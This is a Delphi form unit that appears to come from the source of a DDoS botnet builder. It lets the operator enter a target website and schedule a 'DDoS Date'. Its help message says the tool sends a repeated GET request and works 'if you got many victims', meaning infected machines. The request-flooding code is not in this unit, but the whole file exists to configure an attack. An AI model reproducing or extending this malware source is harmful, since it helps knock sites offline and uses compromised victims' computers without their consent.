unit Unit11;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls;

type
  TForm11 = class(TForm)
    Label1: TLabel;
    Edit1: TEdit;
    CheckBox1: TCheckBox;
    Label2: TLabel;
    Edit2: TEdit;
    Label3: TLabel;
    Edit3: TEdit;
    Button1: TButton;
    Button2: TButton;
    procedure Button2Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Edit1Change(Sender: TObject);
    procedure Edit2Change(Sender: TObject);
    procedure Edit3Change(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form11: TForm11;

implementation

uses Unit1;

{$R *.dfm}

procedure TForm11.Button2Click(Sender: TObject);
begin
MessageBox(0, 'This will only send a /GET request in repeat loop'+#13#10+
              'If you got many victims, this will work.', 'Info', mb_ok);
end;

procedure TForm11.Button1Click(Sender: TObject);
begin
if checkbox1.checked then begin
If Length(Edit2.Text) < 2 Then begin
 Edit2.Color := ClRed; exit; end;
If Length(Edit3.Text) < 2 Then begin
 Edit3.Color := ClRed; exit; end;

If StrToInt(Edit3.Text) > 12 Then begin
 Edit3.Color := ClRed; exit; end;
If StrToInt(Edit2.Text) <= 0 Then begin
 Edit2.Color := ClRed; exit; end;
If StrToInt(Edit3.Text) <= 0 Then begin
 Edit3.Color := ClRed; exit; end;
end;
Form1.Statusbar1.Panels[3].Text := 'Site : '+Edit1.text;
If CheckBox1.Checked Then
 Form1.Statusbar1.Panels[2].Text := 'DDoS Date : '+Edit2.text+'/'+Edit3.text;
Form11.Hide;
end;

procedure TForm11.Edit1Change(Sender: TObject);
begin
if pos('http://', lowercase(edit1.text))=0 then
 button1.Enabled := false
else
 button1.Enabled := true;
end;

procedure TForm11.Edit2Change(Sender: TObject);
begin
edit2.Color := clwhite;
end;

procedure TForm11.Edit3Change(Sender: TObject);
begin
edit3.Color := clwhite;
end;

end.
